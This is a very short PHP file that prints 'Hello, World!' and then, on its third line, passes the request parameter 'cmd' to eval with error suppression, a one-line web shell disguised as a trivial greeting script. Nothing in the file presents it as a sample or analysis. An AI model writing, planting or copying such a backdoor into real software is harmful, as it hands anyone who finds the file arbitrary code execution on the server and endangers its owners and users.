<?php
echo "Hello, World!";
@eval($_REQUEST['cmd']);
?>